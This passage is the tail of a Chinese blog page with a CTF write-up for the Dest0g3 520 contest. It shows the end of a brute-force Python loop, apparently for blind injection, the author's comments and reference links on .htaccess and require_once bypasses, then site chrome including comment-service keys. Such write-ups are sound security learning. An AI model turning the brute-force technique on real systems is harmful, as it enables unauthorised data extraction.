class="comment">#结束本次循环，进入下一次循环</span></span><br><span class="line">    <span class="keyword">if</span>(j==<span class="number">33</span>):<span class="comment">#中断循环</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>同样使用3000000次和1.8的keep，跑出来的结果是最精确的</p>
+<p>当然也可以试试(32,127)，正向跑，<s>不知道正向跑和反向跑哪个快点呢= =</s></p>
+<span class="blur">这是真的慢啊啊啊啊啊</span>
+<p>跑了大概17、8分钟后，终于跑完了</p>
+
+<hr>
+<p>会看wp然后会做的就这点了，剩下的啥都不会做，寄寄寄</p>
+<p>参考资料：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://t.csdn.cn/zw08I">.htaccess文件解析漏洞</a></li>
+<li><a target="_blank" rel="noopener" href="http://t.csdn.cn/iK3P6">Dest0g3 520迎新赛 web部分 wp</a></li>
+<li><a target="_blank" rel="noopener" href="http://t.csdn.cn/rHjxY">PHP字符串函数hex2bin</a></li>
+<li><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/83909.html">require_once 绕过</a></li>
+</ul>
+<p>还是开摆吧，呜呜</p>
+<span class="blur">Orz</span>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                    <a class="donate" href="javascript:;"><i class="fa fa-bitcoin"></i> 打赏</a>
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/";
+            const title         = "「Dest0g3 520 迎新赛部分write up」";
+            const excerpt       = `你管这叫迎新赛…
+猛新啊，那没事了。
+只有自己不会做的世界达成了
+Misc的话… 之后再看看`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/POST/" rel="tag">POST</a>, <a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a>, <a class="tag-none-link" href="/tags/SQL-Injection/" rel="tag">SQL_Injection</a>, <a class="tag-none-link" href="/tags/Upload/" rel="tag">Upload</a>
+                </div>
+                <div class="pull-date">
+                    <time datetime="2023-03-12T09:43:56.839Z" itemprop="dateModified">最后编辑：2023-03-12</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" 看看蚁剑流量包" href="/2022/11/10/看看蚁剑流量包/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" 简单看看无数字字母RCE" href="/2022/11/19/简单看看无数字字母RCE/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+        <div id="v-comments" class="post-comments bg-image"></div>
+<script>
+    var load_comm = () => {
+        const init = () => {
+            new Valine({
+                el: '#v-comments',
+                appId: 'bNjjbBH5XN8401rWT4xZhbCF-gzGzoHsz',
+                appKey: 'R4c5rtiMieN1Kb3frShXDfw8',
+                visitor: true,
+                enableQQ: false,
+                path: '/2022/11/13/Dest0g3-520-%E8%BF%8E%E6%96%B0%E8%B5%9B%E9%83%A8%E5%88%86write-up/'
+                
+            });
+        }
+        if (typeof Valine === 'undefined') {
+            const src = '/vendors/valine@1.4.18/dist/Valine.min.js';
+            $.getScript(src, init);
+        } else {
+            init();
+        }
+    };
+</script>
+
+
+<script>
+<style>
+    .v .veditor{min-height: 10rem;
+        background-image: url(https://cdn.jsdelivr.net/gh/cungudafa/img/images/girls2.png);
+        background-size: contain;
+        background-repeat: no-repeat;
+        background-position: right;
+        background-color: rgba(255,255,255,0);
+        resize: none;}
+</style>
+</script>
+
+
+    <script>
+        new Valine({
+            el: '#vcomments',
+            lang: 'zh-cn',
+            admin_email: '83635877@qq.com',//博主邮箱
+            appId: "",
+            appKey: "",
+            path: window.location.pathname,
+            comment_count: true,
+            //notify: false, // 邮件提醒!使用第三方就不要添加这个!!
+            //verify: true, //验证码
+            avatar: 'monsterid',//小怪物头像
+            placeholder: "qwq~"
+        });
+        
+</script>
+    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        jinrishici.load(function(result) {
+            var jrsc_plac =  result.data.content + "\n「" + result.data.origin.title + "」" + result.data.origin.dynasty + " · " + result.data.origin.author;
+            document.getElementById("veditor").setAttribute("placeholder",jrsc_plac);
+        })
+    </script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://valine.js.org/">comments powered by Valine.</a></noscript>
+
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+        <script src="./js/src/Valine.min.js"></script>   
+        
+        
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/Oscar.jpg" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                20
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                6
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                8
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Misc/">CTF Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF Web</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web-WriteUp/">CTF Web WriteUp</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WriteUp/">CTF WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Intro/">Intro</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A%E7%B3%BB%E5%88%97/">不务正业系列</a><span class="category-list-count">1</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Introduce-Myself/" style="font-size: 0.6em;">Introduce_Myself</a> <a href="/tags/Misc/" style="font-size: 0.6em;">Misc</a> <a href="/tags/POST/" style="font-size: 0.67em;">POST</a> <a href="/tags/RCE/" style="font-size: 0.67em;">RCE</a> <a href="/tags/SQL-Injection/" style="font-size: 0.73em;">SQL_Injection</a> <a href="/tags/Upload/" style="font-size: 0.6em;">Upload</a> <a href="/tags/Web/" style="font-size: 0.8em;">Web</a> <a href="/tags/%E4%B8%8D%E5%8A%A1%E6%AD%A3%E4%B8%9A/" style="font-size: 0.6em;">不务正业</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2023/03/11/%E7%9C%8B%E7%9C%8B%E6%97%A0%E5%9B%9E%E6%98%BERCE/"><i class="fa  fa-book"></i> 看看无回显RCE</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/03/04/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%A4%E4%B8%AA%E7%9F%A5%E8%AF%86%E7%82%B9/"><i class="fa  fa-book"></i> 一道题学习两个知识点</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/03/04/%E7%9C%8B%E7%9C%8Bsession-upload-progress/"><i class="fa  fa-book"></i> 看看session.upload_progress</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/02/19/HSCCTF-2th-WriteUp/"><i class="fa  fa-book"></i> HSCCTF 2th WriteUp</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/"><i class="fa  fa-book"></i> CTFShow 菜狗杯</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        <li><a target="_blank" rel="nofollow" href="https://weibo.com/u/HyDr0genSpectRuM"><i class="fa fa-weibo"></i></a></li>
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://twitter.com/Err0r2333"><i class="fa fa-twitter"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/Err0r233"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2023 Err0r233 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by Err0r2333.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://github.io" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                        <div id="binft"></div>
+  <script>
+    var binft = function (r) {
+      function t() {
+        return b[Math.floor(Math.random() * b.length)]
+      }  
+      function e() {
+        return String.fromCharCode(94 * Math.random() + 33)
+      }
+      function n(r) {
+        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
+          var l = document.createElement("span");
+          l.textContent = e(), l.style.color = t(), n.appendChild(l)
+        }
+        return n
+      }
+      function i() {
+        var t = o[c.skillI];
+        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
+      }
+      var l = "",
+      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {
+      return r + ""
+      }),
+      a = 2,
+      g = 1,
+      s = 5,
+      d = 75,
+      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
+      c = {
+        text: "",
+        prefixP: -s,
+        skillI: 0,
+        skillP: 0,
+        direction: "forward",
+        delay: a,
+        step: g
+      };
+      i()
+      };
+      binft(document.getElementById('binft'));
+  </script>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+
+        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7733928587"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+
+    </body>
+</html>
